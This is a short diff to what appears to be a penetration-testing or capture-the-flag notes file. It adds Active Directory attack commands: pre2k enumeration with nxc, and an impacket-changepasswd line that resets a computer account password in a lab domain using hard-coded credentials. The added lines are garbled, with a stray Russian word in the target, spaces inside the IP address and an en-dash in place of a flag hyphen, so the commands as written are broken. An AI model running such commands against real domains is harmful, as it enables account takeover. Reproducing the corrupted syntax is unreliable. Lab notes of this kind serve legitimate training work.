@@ -1561,4 +1561,5 @@ rsync 10.129.228.37::public/flag.txt flag.txt
 	ls
 	pipx install .
 	pre2k auth -u raj -p Password@1 -dc-ip 192.168.1.48 -d ignite.local
-	
+	nxc ldap 192.168.1.48 -u raj –p Password@1 -M pre2k
+	impacket-changepasswd ignite. расположение /DEMO$@ 192.168 . 1 . 48  -newpass  'Password@987'  -p rpc-samr
